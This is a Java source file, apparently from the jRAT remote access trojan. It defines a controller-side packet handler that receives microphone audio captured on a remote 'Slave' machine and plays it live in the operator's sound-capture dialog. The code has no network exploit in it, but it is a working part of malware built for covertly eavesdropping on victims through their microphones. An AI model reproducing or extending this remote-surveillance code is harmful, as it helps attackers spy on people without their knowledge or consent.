package jrat.controller.packets.incoming;

import jrat.common.Logger;
import jrat.common.Sound;
import jrat.common.utils.DataUnits;
import jrat.controller.Slave;
import jrat.controller.ui.dialogs.DialogRemoteSoundCapture;

import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.SourceDataLine;


public class Packet58ServerDownloadSoundCapture implements IncomingPacket {

    private static SourceDataLine line;

	private static boolean initialized;

	@Override
	public void read(Slave slave) throws Exception {
		int quality = slave.readInt();
		
		DialogRemoteSoundCapture frame = DialogRemoteSoundCapture.INSTANCES.get(slave);
		if (!initialized) {
			AudioFormat format = Sound.getFormat(quality);

            DataLine.Info info = new DataLine.Info(SourceDataLine.class, format);
			if (!AudioSystem.isLineSupported(info)) {
				throw new Exception("Sound line is not supported");
			}
			line = (SourceDataLine) AudioSystem.getLine(info);
			line.open(format);
			line.start();
			initialized = true;
		}

		int size = slave.readInt();
		Logger.log("Reading sound: " + DataUnits.getAsString(size));

		byte[] data = new byte[size];

		slave.getDataInputStream().readFully(data);

		if (frame != null && frame.isRunning()) {
			line.write(data, 0, data.length);
		}
	}

	public void close() {
		if (line != null) {
			line.close();
		}
	}

}
